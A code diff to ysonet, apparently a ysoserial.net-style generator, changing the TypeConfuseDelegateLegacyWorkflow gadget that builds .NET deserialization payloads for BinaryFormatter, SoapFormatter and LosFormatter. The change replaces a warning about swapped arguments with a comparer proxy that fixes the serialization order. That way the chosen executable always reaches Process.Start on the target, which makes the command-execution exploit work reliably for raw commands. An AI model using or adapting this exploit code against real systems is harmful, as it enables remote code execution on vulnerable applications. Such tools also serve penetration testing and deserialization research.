@@ -133,12 +133,12 @@ namespace ysonet.Generators
                     + "\" twice). TreeSet would collapse them to one item and never call "
                     + "the comparer during deserialization.");
 
-            NoteIfArgumentsWillBeSwapped(targetArgs, executable, arguments);
             ValidateTargetShape();
 
             bool soap = formatter.Equals(Formatters.SoapFormatter,
                 StringComparison.OrdinalIgnoreCase);
-            LegacyFunctorComparerProxy comparer = new LegacyFunctorComparerProxy(soap);
+            LegacyFunctorComparerProxy comparer =
+                new LegacyFunctorComparerProxy(soap, executable);
 
             if (soap)
             {
@@ -293,21 +293,22 @@ namespace ysonet.Generators
                 inputArgs.Cmd = contents;
         }
 
-        // As in TypeConfuseDelegate, the larger-sorting item reaches Process.Start's first
-        // parameter. The default "cmd" / "/c ..." pair is safe; a raw pair may be reversed.
-        // This remains a debug-only note so an embedding tool never mixes prose into stdout.
-        private static void NoteIfArgumentsWillBeSwapped(InputArgs inputArgs,
-            string executable, string arguments)
+        // As in TypeConfuseDelegate, the item the target compares SECOND reaches
+        // Process.Start's first parameter, so the executable has to be serialized second. The
+        // default "cmd" / "/c ..." pair sorts that way on its own, but a raw pair may not
+        // ("notepad.exe zzz.txt" used to build Process.Start("zzz.txt", "notepad.exe")), so
+        // the order is fixed at generation time instead: the comparer PROXY that fills the
+        // TreeSet orders by ROLE. It is a generation-only object - the wire carries the
+        // reconstructed CLR-2 FunctorComparer - so nothing about the payload changes for a
+        // command that already sorted the right way round.
+        private static Comparison<string> FillOrderPuttingTheExecutableLast(string executable)
         {
-            if (String.Compare(executable, arguments) >= 0)
-                return;
-
-            Debugging.ShowNote(inputArgs,
-                "[TypeConfuseDelegateLegacyWorkflow] The executable string sorts BELOW the "
-                + "argument string, so this payload calls Process.Start(\"" + arguments
-                + "\", \"" + executable + "\") - the two are swapped. Drop --rawcmd (the "
-                + "'cmd /c' wrapper sorts correctly), or change the command so the executable "
-                + "sorts above its arguments.");
+            return delegate(string x, string y)
+            {
+                if (String.Compare(x, y) == 0)
+                    return 0;
+                return String.Equals(x, executable, StringComparison.Ordinal) ? 1 : -1;
+            };
         }
 
         // Fail at generation with the missing framework shape named explicitly. The target's
@@ -473,10 +474,14 @@ namespace ysonet.Generators
         {
             private readonly LegacyDelegateProxy comparison = new LegacyDelegateProxy();
             private readonly bool soapCompatible;
+            private readonly Comparison<string> authoringOrder;
 
+            // Generation-only: this decides the order the TreeSet is filled in, which is the
+            // order the two strings are serialized in, which is what puts the executable in
+            // Process.Start's first parameter. See FillOrderPuttingTheExecutableLast.
             public int Compare(string left, string right)
             {
-                return String.Compare(left, right);
+                return authoringOrder(left, right);
             }
 
             private LegacyFunctorComparerProxy(SerializationInfo info, StreamingContext context)
@@ -485,9 +490,10 @@ namespace ysonet.Generators
                     "The generation-only comparer proxy is never deserialized.");
             }
 
-            internal LegacyFunctorComparerProxy(bool soapCompatible)
+            internal LegacyFunctorComparerProxy(bool soapCompatible, string executable)
             {
                 this.soapCompatible = soapCompatible;
+                this.authoringOrder = FillOrderPuttingTheExecutableLast(executable);
             }
 
             public void GetObjectData(SerializationInfo info, StreamingContext context)
@@ -549,10 +555,10 @@ namespace ysonet.Generators
             {
                 this.comparer = comparer;
                 // TreeSet.GetObjectData writes Items in comparer order. Preserve the same order
-                // the real generation-time TreeSet used for the BF/Los forms.
-                items = String.Compare(executable, arguments) < 0
-                    ? new string[] { executable, arguments }
-                    : new string[] { arguments, executable };
+                // the real generation-time TreeSet used for the BF/Los forms: the executable
+                // last, so the target compares it against the root and passes it to
+                // Process.Start as the file name. An equal pair is refused before this point.
+                items = new string[] { arguments, executable };
             }
 
             private LegacyTreeSetProxy(SerializationInfo info, StreamingContext context)
